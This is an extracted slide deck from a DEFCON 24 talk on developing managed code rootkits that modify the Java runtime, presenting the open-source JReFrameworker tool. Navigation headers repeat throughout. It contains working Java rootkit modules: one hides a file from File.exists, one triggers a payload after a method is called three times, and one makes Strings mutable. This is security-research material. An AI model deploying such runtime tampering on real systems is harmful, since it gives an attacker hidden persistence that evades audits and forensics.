Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java
Runtime Environment
DEFCON 24, August 6th 2016
Benjamin Holland (daedared)
ben-holland.com
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Developing Managed Code Rootkits for the Java
Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
$ whoami
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
$ whoami
Benjamin Holland (daedared)
B.S. in Computer Engineering (2005 - 2010)
Wabtec Railway Electronics, Ames Lab, Rockwell Collins
B.S. in Computer Science (2010 - 2011)
M.S. in Computer Engineering and Information Assurance (2010 - 2012)
MITRE
Iowa State University Research (2012 - 2015)
DARPA Automated Program Analysis for Cybersecurity (APAC) Program
PhD in Computer Engineering (2015-????)
DARPA Space/Time Analysis for Cybersecurity (STAC) Program
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Background
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hello World
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Managed Code Rootkits (MCRs)
Post exploitation activity (need root/administrator privileges)
C:\Program Files\Java\. . . \lib\rt.jar
Compromises EVERY program using the modiﬁed runtime
Out of sight out of mind
Code reviews/audits don’t typically audit runtimes
May be overlooked by forensic investigators
Rootkits can be platform independent
Runtimes are already fully featured
Object Oriented programming
Standard libraries
Additional access to low level APIs (key events, networking, etc.)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pioneering Work
Pioneering work by Erez Metula (DEFCON 17)
Explored implications of MCRs
"ReFrameworker" tool to modify .NET runtimes
XML modules to deﬁne manipulation tasks
Uses an assembler/disassembler pair to make modiﬁcations
Generates deployment scripts
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Strategies for Modifying the Runtime
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Strategies for Modifying the Runtime
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
New Framework Goals
MCR support for Java Runtime Environment
Minimal prerequisite user knowledge
No knowledge of bytecode or intermediate languages
Simple development cycle
Consider: developing, debugging, deploying
Strive towards portability (Write Once, Exploit
Everywhere)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
JReFrameworker
Write rootkits in Java source!
Modiﬁcation behaviors deﬁned with code
annotations
Develop and debug in Eclipse IDE
Exploit "modules" are Eclipse Java projects
Exportable payload droppers
Bytecode injections are computed on the ﬂy
Free + Open Source (MIT License):
github.com/JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
JReFrameworker
Write rootkits in Java source!
Modiﬁcation behaviors deﬁned with code
annotations
Develop and debug in Eclipse IDE
Exploit "modules" are Eclipse Java projects
Exportable payload droppers
Bytecode injections are computed on the ﬂy
Free + Open Source (MIT License):
github.com/JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hello World Revisited
@MergeType
public class BackwardsPrintStream extends java.io.PrintStream {
@MergeMethod
@Override
public void println(String str){
StringBuilder sb = new StringBuilder(str);
super.println(sb.reverse().toString());
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Annotation Types
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Annotation Types
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Annotation Types
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Modules
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Get Creative
Time to get creative...
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hidden File
@MergeType
public class HiddenFile extends java.io.File {
@MergeMethod
@Override
public boolean exists(){
if(isFile() && getName().equals("secretFile")){
return false;
} else {
return super.exists();
}
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hidden File
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hidden File
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Beetlejuice
@MergeType
public class BeetlejuicePS extends java.io.PrintStream {
@DefineField
private int beetlejuice;
@MergeMethod
public void println(String str){
StackTraceElement[] st = new Exception().getStackTrace();
for(StackTraceElement element : st){
if(element.getMethodName().equals("beetlejuice")){
if(++beetlejuice==3) i.Main.main(new String[]{});
super.println(str);
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Beetlejuice
public class Test {
static class TimBurton {}
public static void main(String[] args) {
TimBurton timBurton = new TimBurton();
beetlejuice(timBurton);
beetlejuice(timBurton);
beetlejuice(timBurton);
}
private static void beetlejuice(TimBurton timBurton){
System.out.println(timBurton.toString());
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Beetlejuice
The “i.Main.main(new String[]);”
invokes Mocha DOOM
Port of DOOM shareware to pure Java
github.com/AXDOOMER/mochadoom
Payload behaviors can depend on the
state or structure of the client program
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Mutable Strings
public static void main(String[] args) {
String demand = "sacrifice";
demand.replace("sacrifice", "puppy");
System.out.println("Satan demands a " + demand + "!");
}
Immutable: demand="sacrifice"
Mutable: demand="puppy"
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Mutable Strings
@DefineTypeFinality(finality=false)
@DefineFieldFinality(field="value", finality=false)
@DefineFieldVisibility(field="value", visibility="protected")
@MergeType
public class MutableString extends java.lang.String {
@MergeMethod
public String replace(CharSequence s1, CharSequence s2){
String result = super.replace(s1, s2);
// hey Java you forgot to update your value...so I fixed it :)
value = result.toCharArray();
return result;
}
}
DEFCON 24, August 6th 2016